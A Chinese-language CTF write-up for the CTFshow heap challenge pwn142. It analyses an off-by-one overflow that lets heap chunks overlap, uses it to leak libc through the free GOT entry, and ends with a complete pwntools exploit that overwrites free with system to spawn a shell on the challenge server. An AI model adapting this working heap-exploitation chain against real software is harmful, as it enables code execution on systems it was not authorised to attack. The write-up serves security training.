---
title: CTFshow pwn142
---
# CTFshow pwn142（堆风水？|堆块重叠）
## ida分析
### menu
![f7cffd67496a436bb6cad9ebfd00decf.png](https://img.picui.cn/free/2025/03/10/67ce92f6ce057.png)
四个功能：创建、编辑、打印、删除

### create分析
![bef06bdf0a3923914eb6b5c389c43e74.png](https://img.picui.cn/free/2025/03/10/67ce936bbb0b1.png)
1.先申清一个0x10的堆块，里面存放size，和接下来申清的堆块的地址
2.利用存放的地址，寻找堆块位置输入

### edit分析
![1741591628419.png](https://img.picui.cn/free/2025/03/10/67ce944e433a1.png)
1.这里存在一个off-by-one的漏洞，可以造成堆块的重叠

### show分析
![1741591738926.png](https://img.picui.cn/free/2025/03/10/67ce94bc5a792.png)
1.可以通过printf泄露libc


### delete分析
![1741591782030.png](https://img.picui.cn/free/2025/03/10/67ce94e7855ee.png)
1.没有留下uaf漏洞

## 构造思路
1.首先创建两个大小分别为0x18和0x10的堆块。此时会有四个堆块，通过`edit 0` 溢出到下一个堆块的size为0x41，造成堆块的重叠。同时将0 号堆块的内容设置为`/bin/sh\x00`
2.接着`delete 1` ,再申请一块大小为0x30的堆块。
3.此时，在creat时，会将原先第四个堆块先申请给0x10的堆块。然后申清0x30时，原先的第三、第四堆块都分配。也就是我们可以通过`edit 1`修改头部的chunk。
4.如果creat时，将chunk的内容填充为free_got， 就可以使用`show 1`泄露libc。并且`edit 1`可以修改got 表的内容


## exp
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='pwn.challenge.ctf.show'
port=28206
elf=ELF("./pwn")
if mode == 0:
    io=process("./pwn")
else :
    io=remote(url,port)

def add(size,content):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.sendline(content)

def edit(idx,content):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(idx))
    io.recvuntil("Content of heap : ")
    io.sendline(content)

def show(idx):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil("Your choice :")
    io.sendline("4")
    io.recvuntil("Index :")
    io.sendline(str(idx))

free_got=elf.got["free"]
add(0x18,b'aaaa') #0
add(0x10,b'bbbb') #1
payload=b'/bin/sh\x00'.ljust(0x18,b'\x61')+b'\x41'
edit(0,payload)
#gdb.attach(io)
delete(1)
add(0x30,p64(0)*4+p64(0x30)+p64(free_got))
show(1)

io.recvuntil("Content : ")
free=u64(io.recv(6).ljust(8,b'\x00'))
log.success('free-{}'.format(hex(free)))
libc=finder("free",free)
libcbase=free-libc.dump("free")
system=libcbase+libc.dump("system")
edit(1,p64(system))
delete(0)

io.interactive()
```